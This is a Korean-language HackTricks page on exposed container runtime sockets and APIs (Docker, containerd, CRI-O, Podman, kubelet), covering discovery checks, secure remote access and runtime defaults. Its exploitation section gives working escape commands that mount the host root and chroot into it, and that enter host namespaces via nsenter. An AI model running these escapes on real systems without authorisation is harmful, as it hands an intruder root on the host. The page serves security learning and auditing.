# 런타임 API 및 데몬 노출

{{#include ../../../banners/hacktricks-training.md}}

## 개요

많은 실제 컨테이너 침해는 전혀 네임스페이스 탈출로 시작하지 않습니다. 대신 런타임 제어 평면에 대한 접근으로 시작합니다. 워크로드가 마운트된 Unix 소켓이나 노출된 TCP 리스너를 통해 `dockerd`, `containerd`, CRI-O, Podman, 또는 kubelet과 통신할 수 있다면, 공격자는 더 높은 권한의 새 컨테이너를 요청하거나 호스트 파일시스템을 마운트하거나 호스트 네임스페이스에 조인하거나 민감한 노드 정보를 가져올 수 있습니다. 그런 경우 런타임 API가 실제 보안 경계이며, 이를 손상시키는 것은 기능적으로 호스트를 손상시키는 것과 거의 같습니다.

이 때문에 런타임 소켓 노출은 커널 보호와 별도로 문서화되어야 합니다. 일반적인 seccomp, capabilities, 그리고 MAC confinement이 적용된 컨테이너라도 내부에 `/var/run/docker.sock` 또는 `/run/containerd/containerd.sock`이 마운트되어 있으면 여전히 호스트 침해까지 단 한 번의 API 호출만 남아 있을 수 있습니다. 현재 컨테이너의 커널 격리는 설계대로 작동하고 있을지라도 런타임 관리 평면이 완전히 노출되어 있을 수 있습니다.

## 데몬 접근 모델

Docker Engine은 전통적으로 `unix:///var/run/docker.sock`의 로컬 Unix 소켓을 통해 특권 API를 노출합니다. 역사적으로는 `tcp://0.0.0.0:2375` 같은 TCP 리스너나 `2376`의 TLS 보호 리스너를 통해 원격 노출되기도 했습니다. 강력한 TLS와 클라이언트 인증 없이 데몬을 원격으로 노출하면 Docker API는 사실상 원격 root 인터페이스가 됩니다.

containerd, CRI-O, Podman, 그리고 kubelet도 유사하게 큰 영향을 미치는 인터페이스를 노출합니다. 이름과 워크플로우는 다르지만 논리는 동일합니다. 인터페이스가 호출자에게 워크로드를 생성하거나 호스트 경로를 마운트하거나 자격증명을 가져오거나 실행 중인 컨테이너를 변경하도록 허용한다면, 해당 인터페이스는 특권 관리 채널이며 그에 맞게 취급되어야 합니다.

확인해볼 가치가 있는 일반적인 로컬 경로는 다음과 같습니다:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
구형이거나 더 특화된 스택은 `dockershim.sock`, `frakti.sock`, 또는 `rktlet.sock` 같은 엔드포인트를 노출할 수도 있습니다. 이런 엔드포인트는 최신 환경에서는 덜 흔하지만, 발견되면 일반 애플리케이션 소켓이 아니라 런타임 제어 표면으로 간주되어 동일한 주의를 기울여야 합니다.

## 안전한 원격 액세스

데몬을 로컬 소켓 밖으로 노출해야 한다면, 연결은 TLS로 보호되어야 하며 가능하면 상호 인증을 사용해 데몬이 클라이언트를 검증하고 클라이언트가 데몬을 검증하도록 해야 합니다. 편의상 Docker daemon을 평문 HTTP로 열어두는 오래된 습관은 컨테이너 관리에서 가장 위험한 실수 중 하나인데, API 표면이 권한 있는 컨테이너를 직접 생성할 만큼 강력하기 때문입니다.

과거의 Docker 구성 패턴은 다음과 같았습니다:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
On systemd-based hosts, 데몬 통신은 `fd://`처럼 나타날 수 있는데, 이는 프로세스가 직접 바인딩하지 않고 systemd로부터 미리 열린 소켓을 상속받는다는 뜻이다. 중요한 교훈은 정확한 구문이 아니라 보안상의 결과이다. 데몬이 엄격히 권한이 제한된 로컬 소켓을 넘어 리스닝을 시작하는 순간, 전송 보안(transport security)과 클라이언트 인증은 선택적 강화가 아니라 필수 조건이 된다.

## 악용

런타임 소켓(runtime socket)이 존재한다면, 어떤 소켓인지, 호환 가능한 클라이언트가 있는지, 그리고 raw HTTP나 gRPC로의 접근이 가능한지를 확인하라:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
이 명령어들은 dead path, 마운트되었으나 접근 불가능한 socket, 그리고 live privileged API를 구분해주기 때문에 유용하다. client가 성공하면 다음 질문은 API가 host bind mount나 host namespace sharing을 통해 새로운 container를 실행할 수 있는지이다.

### 전체 예시: Docker Socket To Host Root

만약 `docker.sock`에 접근할 수 있다면, 전형적인 escape는 호스트 루트 파일시스템을 마운트한 새 container를 시작한 뒤 `chroot` 하는 것이다:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
이는 Docker daemon을 통해 호스트의 루트 권한으로 직접 실행할 수 있게 합니다. 영향은 파일 읽기에만 국한되지 않습니다. 새 컨테이너 내부에 들어가면 공격자는 호스트 파일을 변경하고, 자격 증명을 탈취하며, 지속성을 확보하거나 추가로 권한이 높은 워크로드를 시작할 수 있습니다.

### 전체 예: Docker Socket To Host Namespaces

공격자가 파일시스템 전용 접근 대신 네임스페이스 진입을 선호한다면:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
이 경로는 현재 컨테이너를 악용하는 대신 런타임에 명시적으로 호스트 네임스페이스를 노출하도록 새로운 컨테이너를 생성해 달라고 요청함으로써 호스트에 도달합니다.

### 전체 예제: containerd Socket

마운트된 `containerd` 소켓은 보통 같은 정도로 위험합니다:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
영향은 다시 호스트 침해입니다. Docker 전용 도구가 없더라도, 다른 런타임 API가 동일한 관리 권한을 제공할 수 있습니다.

## Checks

이 체크들의 목적은 컨테이너가 신뢰 경계 밖에 있어야 하는 어떤 관리 영역(management plane)에 접근할 수 있는지 여부를 확인하는 것입니다.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
여기서 주목할 점:

- 마운트된 런타임 소켓은 단순한 정보 노출이 아니라 보통 직접적인 관리자 권한 수단이다.
- TLS 없이 `2375`에서 대기하는 TCP 리스너는 원격 침해 상태로 간주해야 한다.
- `DOCKER_HOST`와 같은 환경 변수는 종종 워크로드가 호스트 런타임과 의도적으로 통신하도록 설계되었음을 드러낸다.

## 런타임 기본값

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd`가 로컬 소켓에서 대기하며 데몬은 보통 root 권한으로 실행된다 | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | 일반적인 로컬 사용에는 장기간 실행되는 특권 데몬이 필요하지 않다; `podman system service`가 활성화되면 API 소켓이 노출될 수 있다 | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | 관리 API가 로컬 소켓을 통해 노출되며 보통 상위 레벨 도구들에 의해 사용된다 | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | CRI 엔드포인트는 노드 로컬의 신뢰된 컴포넌트를 위한 것이다 | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet은 Pod에서 광범위하게 접근 가능해서는 안 된다; 접근은 authn/authz에 따라 pod 상태, 자격 증명 및 실행 기능을 노출할 수 있다 | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
